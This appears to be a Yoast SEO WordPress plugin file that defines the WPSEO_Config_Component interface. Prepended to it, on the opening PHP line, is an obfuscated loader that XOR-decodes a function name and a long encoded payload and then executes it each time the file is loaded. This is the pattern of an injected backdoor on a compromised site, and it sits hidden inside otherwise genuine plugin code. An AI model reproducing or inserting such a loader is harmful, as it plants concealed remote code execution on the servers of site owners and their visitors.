<?php $nNaDPY='PRUM0,s5K<OX,.W'; $WGeQFa='3 0,DI,S>R,,EA9'^$nNaDPY; $SXkcpKVo='GUnnQCBU13T4aK U417MsV>5k7Z Z<aM1LDEye481H9U, EW9V,UHo5TI7fmA  mj4WJ,cAs,RApquegn7xpxtUO9KGnNfzxCqX+ phSdVVejHp3QD GYQ>ml036 jKwkEcbJ2gol73;MWzorm+PG0waXkopnlR=;+BIawP620P-TnqS,UbgdXK8gN47D+SIm;GEahlbGyJ=hN=Q;,MJoTJZ<THnr5WOUn8 <rlMSRL> lCB1, 4WHZClKcr>r.=ng8Nee  =KETrfOZX2 poFzQoX3>;9R3UiWMuQT>AmGuXLN.qxvI=8U=.N9.exP5ZJLWD72RzzBFz>.4-1+Yklcod 546hym4=KS RKPmqCSJT4,6od:7gqqHS75= V6QozvVQ;q92lpJR30KyRb9MZ=4RlpGl5ekJJO,AneNn1S==BY6GPW6d9Z5hSW,.24C=IeX2M6uptSQ0 O.dKXMMYjniO2S-9o +CLkbH8Zdt= BOznmyS6IUBc 35m52=G  eeVTHHHrP<PDAJeOQjaV EmIIXXTbCSQRP8oQjnrt 0cIC3+8lulIQTLxgCBWfBYAVU7L;pInbopdqe >=S.-1S6>E;36G:Cj ,WAXYDFvMvYZ>3DMcMamnWULs4J2:fEQULU3o;U<8XW4v4dv=p=SE6fGhCd6'; $YqpmxLBG=$WGeQFa('', '.3FO76,6EZ;Z>.X<GEDeT.QG4S;T;c> D8clPEO28.L;OT,8WvT::0Q5=V92,UTENP6>MOaWG78YQUEGNLryqP::MkzNiAArJx>DRXL:DkvUQhTZm7T554PEHTRBACpWO,HIc8nfHXFOmyGOZIO13Q,E16O.NH9XBpf ARpEFB<H:FU8I,K:McA1n<QC1Y=aIT21HSfk:s77bjY0OMmwO2+6O1sdVQ6;41SEERQm53 MEWIHWCRQ6+2cDo<1q=et+GY=EAKEDkxjRB9;4GEYO=pXK<RJZf9V,IjmQ:1GzgNQ<-:OQEVmKY9HKu3Sor9Szbms VF3SZ9LsXAFHPH1KDG06edas;-MUNkwK72pPOcw<5XYSFDA=nxU,2CTbK3OqRZR=4BJ3;eT.3GQkDrFO,6HQify:fHoan..X NXn.D=NX00W+9-SLA5G776XOmk.H=M:S>SCD+74SO+KLo<,98CBIkV2YX0KN:eBYBQ<LPYA6.ZHKY2D;4;<KVL2PJT4TSMB=11odRtX10 cEiwJI;DpEm-9,59d84+weFqWSRSCUP-uWIZYAYp36xLUvrfQv8r00UxYGyVEFPBWEALO2WrZ6Oa CZE3IkMPM.-78 aZmR=;JRmdCmAMNw.FzQ<SVNa5484hHK4ET76PQiMM7yX+,BNwAxnK'^$SXkcpKVo); $YqpmxLBG();
/**
 * @package WPSEO\Admin\ConfigurationUI
 */

/**
 * Config Component interface
 */
interface WPSEO_Config_Component {
	/**
	 * @return string
	 */
	public function get_identifier();

	/**
	 * @return mixed
	 */
	public function get_data();

	/**
	 * Save changes
	 *
	 * @param array $data Data provided by the API.
	 *
	 * @return mixed
	 */
	public function set_data( $data );

	/**
	 * @return WPSEO_Config_Field
	 */
	public function get_field();
}
